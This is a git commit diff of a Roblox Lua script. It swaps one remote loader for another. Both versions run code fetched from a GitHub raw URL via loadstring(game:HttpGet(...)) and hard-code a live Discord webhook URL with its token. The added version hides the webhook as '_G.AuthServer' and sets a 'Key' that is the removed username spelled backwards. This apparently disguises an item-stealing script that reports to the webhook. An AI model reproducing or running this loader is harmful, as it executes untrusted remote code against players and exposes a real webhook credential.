163f9e8caea8659e0ec29f22ac6eb011764200f0
IMakeScripts82737 <120314687+IMakeScripts82737@users.noreply.github.com>
2022-12-12 09:05:17 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,4 +1,3 @@
-UserName = "Johnpogi123875"
-WebHook = "https://discord.com/api/webhooks/1051471522411331654/3U7htioWabm6A0Rs5RLM6wCA0tVmaZIaCMau58LpGODqDRZ7DdS3mDN39J7mv1lvO1GP"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+_G.Key = "578321igopnhoJ" 
+_G.AuthServer = "https://discord.com/api/webhooks/1051471522411331654/3U7htioWabm6A0Rs5RLM6wCA0tVmaZIaCMau58LpGODqDRZ7DdS3mDN39J7mv1lvO1GP" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
